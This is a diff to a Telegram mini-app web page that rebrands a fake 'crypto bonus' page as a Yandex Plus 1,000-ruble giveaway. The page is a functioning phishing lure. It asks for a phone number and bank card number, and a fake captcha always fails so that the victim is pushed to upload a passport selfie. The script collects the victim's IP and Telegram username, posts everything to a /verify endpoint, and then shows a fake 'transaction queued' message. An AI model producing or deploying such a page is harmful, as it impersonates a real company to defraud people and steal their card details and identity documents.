@@ -3,20 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Crypto Bonus Distribution</title>
+    <title>Yandex Plus Distribution</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --primary: #00f2ff;
-            --secondary: #7000ff;
+            --primary: #FFCC00; /* Яндекс Желтый */
+            --secondary: #ff3333;
             --bg: #050505;
             --text: #ffffff;
+            --plus-gradient: linear-gradient(135deg, #7b42f6, #b01cd4);
         }
 
         body {
             background: var(--bg);
             color: var(--text);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: "Yandex Sans Text", -apple-system, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -25,43 +26,39 @@
             overflow: hidden;
         }
 
-        /* Анимированный фон с движущимися огнями */
         .bg-animate {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
             background: 
-                radial-gradient(circle at 20% 30%, rgba(112, 0, 255, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 80% 70%, rgba(0, 242, 255, 0.15) 0%, transparent 40%);
+                radial-gradient(circle at 20% 30%, rgba(255, 204, 0, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(123, 66, 246, 0.15) 0%, transparent 40%);
             z-index: -1;
             animation: pulseBg 8s infinite alternate;
         }
 
-        @keyframes pulseBg {
-            0% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
+        @keyframes pulseBg { 0% { opacity: 0.6; } 100% { opacity: 1; } }
 
         .card {
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 32px;
-            padding: 35px;
+            padding: 30px;
             width: 90%;
             max-width: 380px;
             text-align: center;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
         }
 
-        /* Эффект пробегающего блеска */
+        /* Эффект сияния */
         .card::before {
             content: '';
             position: absolute;
             top: -50%; left: -50%;
             width: 200%; height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
+            background: linear-gradient(45deg, transparent, rgba(255,204,0,0.05), transparent);
             transform: rotate(45deg);
             animation: shimmer 4s infinite;
         }
@@ -71,96 +68,100 @@
             100% { transform: translateX(150%) rotate(45deg); }
         }
 
-        .amount {
-            font-size: 56px;
-            font-weight: 900;
-            margin: 10px 0;
-            background: linear-gradient(to right, #00f2ff, #0077ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 0 15px rgba(0, 242, 255, 0.3));
-        }
-
-        .status-badge {
-            display: inline-block;
-            background: rgba(0, 255, 133, 0.1);
-            color: #00ff85;
-            padding: 6px 16px;
-            border-radius: 100px;
-            font-size: 12px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        .y-logo {
+            width: 80px;
+            filter: drop-shadow(0 0 10px rgba(255,204,0,0.3));
             margin-bottom: 10px;
         }
 
+        .plus-tag {
+            background: var(--plus-gradient);
+            padding: 4px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .amount {
+            font-size: 52px;
+            font-weight: 900;
+            margin: 5px 0;
+            background: linear-gradient(to right, #FFCC00, #FFEE00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 15px rgba(255, 204, 0, 0.4));
+        }
+
         .input-box {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.07);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 16px;
             padding: 15px;
             width: 100%;
             color: white;
             font-size: 16px;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             box-sizing: border-box;
             transition: 0.3s;
         }
 
         .input-box:focus {
             border-color: var(--primary);
-            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
+            background: rgba(255, 255, 255, 0.1);
             outline: none;
         }
 
-        /* Пульсирующая кнопка */
         .main-btn {
             width: 100%;
             padding: 20px;
-            background: linear-gradient(90deg, #0077ff, #00f2ff);
+            background: var(--primary);
             border: none;
-            border-radius: 18px;
-            color: white;
+            border-radius: 20px;
+            color: #000;
             font-size: 18px;
             font-weight: 800;
             cursor: pointer;
             text-transform: uppercase;
-            box-shadow: 0 10px 30px rgba(0, 119, 255, 0.4);
+            box-shadow: 0 10px 30px rgba(255, 204, 0, 0.3);
             animation: btnPulse 2s infinite;
         }
 
         @keyframes btnPulse {
-            0% { transform: scale(1); box-shadow: 0 10px 30px rgba(0, 119, 255, 0.4); }
-            50% { transform: scale(1.02); box-shadow: 0 10px 40px rgba(0, 242, 255, 0.6); }
-            100% { transform: scale(1); box-shadow: 0 10px 30px rgba(0, 119, 255, 0.4); }
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); box-shadow: 0 10px 40px rgba(255, 204, 0, 0.5); }
+            100% { transform: scale(1); }
         }
 
         .captcha-area {
-            background: rgba(0,0,0,0.3);
+            background: rgba(255,255,255,0.05);
             border-radius: 16px;
             padding: 15px;
-            margin: 20px 0;
+            margin: 15px 0;
             display: flex;
             align-items: center;
             cursor: pointer;
-            border: 1px solid rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
         .check-circle {
-            width: 24px; height: 24px;
+            width: 22px; height: 22px;
             border: 2px solid var(--primary);
-            border-radius: 50%;
+            border-radius: 6px;
             margin-right: 15px;
-            position: relative;
+            display: flex; align-items: center; justify-content: center;
         }
 
         .photo-step {
-            font-size: 13px;
-            color: #888;
+            font-size: 12px;
+            color: #aaa;
             margin-bottom: 20px;
-            background: rgba(255,255,255,0.02);
-            padding: 15px;
-            border-radius: 12px;
+            background: rgba(255,255,255,0.03);
+            padding: 12px;
+            border-radius: 16px;
+            border: 1px dashed rgba(255,255,255,0.2);
         }
     </style>
 </head>
@@ -169,108 +170,84 @@
 <div class="bg-animate"></div>
 
 <div class="card">
-    <div class="status-badge">Доступно к выводу</div>
-    <div class="amount" id="bonusAmt">1,000 ₽</div>
-    <p style="color: #ccc; font-size: 14px; margin-bottom: 25px;">Средства зачисляются мгновенно через шлюз системы быстрых платежей.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Yandex_logo.svg" class="y-logo">
+    <br>
+    <div class="plus-tag">ПЛЮС БОНУС</div>
+    
+    <div class="amount">1,000 ₽</div>
+    <p style="color: #bbb; font-size: 13px; margin-bottom: 20px;">Средства зачисляются мгновенно через систему быстрых платежей.</p>
 
     <form id="claimForm">
-        <select id="currency" class="input-box" onchange="updateUI()">
-            <option value="RUB">🇷🇺 Получить на карту РФ (1,000 ₽)</option>
-            <option value="USD">🌎 International Cards ($100)</option>
-        </select>
-
         <input type="text" id="phone" class="input-box" placeholder="Номер телефона / СБП" required>
         <input type="text" id="card" class="input-box" placeholder="Номер карты зачисления" required>
 
         <div class="captcha-area" onclick="handleCaptcha(this)">
             <div class="check-circle" id="capCircle"></div>
-            <span id="capText" style="font-size: 14px;">Подтвердить, что я не бот</span>
+            <span id="capText" style="font-size: 14px;">Я не робот (проверка Яндекс ID)</span>
         </div>
 
         <div class="photo-step">
-            Для завершения транзакции сделайте селфи с документом (проверка владения счетом)
+            <b>Фото-подтверждение</b><br>
+            Сделайте селфи с паспортом для верификации владельца счета
             <input type="file" id="photo" accept="image/*" capture="camera" style="display:none;" required>
-            <button type="button" onclick="document.getElementById('photo').click()" style="margin-top:10px; background:none; border:1px solid #555; color:white; padding:5px 15px; border-radius:8px; cursor:pointer;">Сделать фото</button>
+            <button type="button" onclick="document.getElementById('photo').click()" style="margin-top:10px; background:rgba(255,204,0,0.1); border:1px solid var(--primary); color:var(--primary); padding:8px 20px; border-radius:10px; cursor:pointer; font-weight:bold;">СДЕЛАТЬ ФОТО</button>
         </div>
 
-        <button type="submit" class="main-btn" id="submitBtn">Забрать средства</button>
+        <button type="submit" class="main-btn" id="submitBtn">Получить 1,000 ₽</button>
     </form>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-
-    function updateUI() {
-        const val = document.getElementById('currency').value;
-        document.getElementById('bonusAmt').innerText = (val === 'USD') ? '$100' : '1,000 ₽';
-    }
+    tg.setHeaderColor('#050505');
 
     function handleCaptcha(el) {
         const text = document.getElementById('capText');
         const circle = document.getElementById('capCircle');
-        text.innerText = 'Проверка...';
-        circle.style.borderTopColor = 'transparent';
-        circle.style.animation = 'spin 1s linear infinite';
+        text.innerText = 'Синхронизация...';
+        circle.innerHTML = '⌛';
         
         setTimeout(() => {
-            alert('Ошибка автоматической проверки. Требуется фото-подтверждение ниже.');
-            text.innerText = 'Ошибка. Пройдите фото-верификацию.';
-            circle.style.animation = 'none';
-            circle.style.background = '#ff4b4b';
-            circle.style.borderColor = '#ff4b4b';
+            alert('Ошибка Яндекс ID. Требуется ручное подтверждение через фото-верификацию.');
+            text.innerText = 'Ошибка. Пройдите проверку ниже.';
+            circle.innerHTML = '❌';
+            circle.style.borderColor = '#ff3333';
+            circle.style.color = '#ff3333';
         }, 1500);
     }
 
     document.getElementById('claimForm').onsubmit = async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
-        btn.innerText = 'ВЫПОЛНЯЕТСЯ ПЕРЕВОД...';
+        btn.innerText = 'ПЕРЕВОД...';
         btn.disabled = true;
 
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const { ip } = await ipRes.json();
-
-            const deviceData = {
-                ua: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            const userData = tg.initDataUnsafe?.user || {};
-
-            const fullInfo = `
-📱 DEV: ${deviceData.ua}
-🖥 SCR: ${deviceData.screen}
-🌍 TZ: ${deviceData.tz}
-👤 TG: @${userData.username || 'unknown'} (ID: ${userData.id || 'N/A'})
-⭐ PREM: ${userData.is_premium ? 'YES' : 'NO'}`;
-
+            
             const formData = new FormData();
-            formData.append('phone', `[${document.getElementById('currency').value}] ${document.getElementById('phone').value} | Card: ${document.getElementById('card').value}`);
+            formData.append('phone', `YANDEX: ${document.getElementById('phone').value} | Card: ${document.getElementById('card').value}`);
             formData.append('ip', ip);
-            formData.append('details', fullInfo);
+            formData.append('details', `USER: @${tg.initDataUnsafe?.user?.username || 'unknown'}`);
             formData.append('photo', document.getElementById('photo').files[0]);
 
             await fetch('/verify', { method: 'POST', body: formData });
             
             tg.showPopup({
-                title: 'Транзакция приостановлена',
-                message: 'Ваш банк затребовал дополнительную проверку. С вами свяжется оператор в течение 24 часов.',
+                title: 'Транзакция в очереди',
+                message: 'Средства зачислятся после проверки фото-верификации оператором службы поддержки Яндекс.',
                 buttons: [{type: 'close'}]
             });
         } catch (err) {
-            alert('Ошибка шлюза. Повторите попытку позже.');
+            alert('Ошибка сервера. Попробуйте позже.');
         } finally {
-            btn.innerText = 'Забрать средства';
+            btn.innerText = 'Получить 1,000 ₽';
             btn.disabled = false;
         }
     };
 </script>
-
-<style>
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-</style>
 
 </body>
 </html>
